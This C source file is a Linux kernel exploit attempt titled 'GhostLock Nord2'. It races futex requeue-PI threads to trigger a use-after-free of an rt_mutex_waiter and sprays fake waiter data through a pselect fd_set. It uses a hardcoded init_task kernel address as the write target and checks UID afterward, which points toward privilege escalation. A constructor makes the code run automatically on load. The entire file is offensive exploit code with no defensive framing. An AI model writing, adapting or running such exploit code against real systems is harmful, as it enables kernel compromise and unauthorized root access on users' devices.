// GhostLock Nord2 - pselect-based controlled write
// Uses fd_set to write fake rt_mutex_waiter data

#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <stdatomic.h>
#include <errno.h>
#include <sys/select.h>
#include <fcntl.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

// Fake waiter values (will be set by main)
static uint64_t fake_task;
static uint64_t fake_lock;
static int fake_prio = 1;

static uint32_t f_wait = 0;
static uint32_t f_pi_target = 0;
static atomic_int owner_ready = 0;
static atomic_int waiter_ready = 0;
static atomic_int waiter_woken = 0;
static atomic_int stop_race = 0;

static int read_task_prio(uint32_t tid) {
    char path[64]; snprintf(path, sizeof(path), "/proc/%u/stat", tid);
    FILE *f = fopen(path, "r"); if (!f) return -1;
    int pid; char comm[256]; char state;
    fscanf(f, "%d %s %c", &pid, comm, &state);
    long tmp; for (int i = 0; i < 14; i++) fscanf(f, " %ld", &tmp);
    int prio = -1; fscanf(f, " %d", &prio);
    fclose(f); return prio;
}

static atomic_int waiter_did_pselect = 0;

void *owner_thread_fn(void *arg) {
    (void)arg;
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    
    struct sched_param sp = { .sched_priority = 50 };
    sched_setscheduler(0, SCHED_FIFO, &sp);
    
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_ready, 1);
    
    while (!atomic_load(&stop_race)) {
        // Unlock - waiter wakes
        syscall(SYS_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        
        // Wait for waiter to do pselect
        while (!atomic_load(&waiter_did_pselect)) usleep(100);
        
        // Now reacquire - this triggers the UAF write
        syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        usleep(1000);
    }
    
    sp.sched_priority = 0;
    sched_setscheduler(0, SCHED_OTHER, &sp);
    return NULL;
}

// Place a 64-bit word in fd_set at specific word offset
static void fdset_put_word(fd_set *set, int word_idx, uint64_t value) {
    unsigned long *bits = (unsigned long *)set;
    bits[word_idx] = value;
}

void *waiter_thread_fn(void *arg) {
    (void)arg;
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    setpriority(PRIO_PROCESS, 0, -5);
    
    atomic_store(&waiter_ready, 1);
    
    // Block on futex requeue
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 5;
    int ret = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    
    // After waking, immediately call pselect with controlled data
    // The goal: pselect's kernel stack usage should overlap with the freed rt_mutex_waiter
    
    atomic_store(&waiter_woken, 1);
    
    // Large fd_set with fake waiter data
    fd_set read_fds;
    FD_ZERO(&read_fds);
    
    // Fill entire fd_set with our pattern
    // Each word should help the fake waiter land somewhere
    unsigned long *bits = (unsigned long *)&read_fds;
    for (int word = 0; word < 128; word += 3) {
        bits[word] = (unsigned long)fake_task;
        if (word + 1 < 128) bits[word + 1] = (unsigned long)fake_lock;
        if (word + 2 < 128) bits[word + 2] = fake_prio;
    }
    
    int tfd = open("/dev/null", O_RDONLY);
    int high_fd = fcntl(tfd, F_DUPFD, 1023);
    close(tfd);
    
    struct timespec timeout = { .tv_sec = 0, .tv_nsec = 1 };
    pselect(high_fd + 1, &read_fds, NULL, NULL, &timeout, NULL);
    close(high_fd);
    
    // Signal owner that we did pselect
    atomic_store(&waiter_did_pselect, 1);
    
    // Wait for UAF to trigger
    sleep(1);
    return NULL;
}

int main(void) {
    static int ran = 0;
    if (ran) return 0;
    ran = 1;
    
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    fprintf(stderr, "=== GhostLock Nord2 - pselect Write Test ===\n\n");
    
    // Setup fake values
    // fake_task: where rt_mutex_setprio will write
    // fake_lock: needs non-NULL owner field
    // For testing, let's use current task's task_struct
    // We don't know our task_struct address, so just test with init_task
    fake_task = 0xffffff800957b6c0ULL;  // init_task
    // fake_lock should point to something with a valid "owner" at offset +0
    // selinux_state has pointers... let's try something else
    fake_lock = 0;  // NULL - will cause different crash but at least predictable
    
    fprintf(stderr, "[*] fake_task=%llx fake_lock=%llx fake_prio=%d\n",
            (unsigned long long)fake_task, (unsigned long long)fake_lock, fake_prio);
    
    cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(2, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    
    fprintf(stderr, "[*] Starting owner...\n");
    pthread_t owner_thr;
    pthread_create(&owner_thr, NULL, owner_thread_fn, NULL);
    while (!atomic_load(&owner_ready)) {}
    
    fprintf(stderr, "[*] Running UAF attempts...\n");
    
    for (int i = 0; i < 5; i++) {
        f_wait = 0;
        atomic_store(&waiter_ready, 0);
        atomic_store(&waiter_woken, 0);
        atomic_store(&waiter_did_pselect, 0);
        
        pthread_t waiter_thr;
        pthread_create(&waiter_thr, NULL, waiter_thread_fn, NULL);
        while (!atomic_load(&waiter_ready)) {}
        
        usleep(1000);
        
        // Trigger requeue
        int ret = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        
        // Wait for waiter to wake and do pselect
        int wait_count = 0;
        while (!atomic_load(&waiter_did_pselect) && wait_count++ < 100) usleep(1000);
        
        // Small delay for UAF to trigger
        usleep(10000);
        
        if (ret == 1) {
            uint32_t tid = f_pi_target & 0x3FFFFFFF;
            int p = read_task_prio(tid);
            fprintf(stderr, "[%d] prio=%d\n", i, p);
            
            uid_t uid = getuid();
            fprintf(stderr, "[%d] UID=%d\n", i, uid);
        }
        
        pthread_detach(waiter_thr);
    }
    
    atomic_store(&stop_race, 1);
    fprintf(stderr, "\n[DONE]\n");
    return 0;
}

__attribute__((constructor))
void init(void) { main(); }
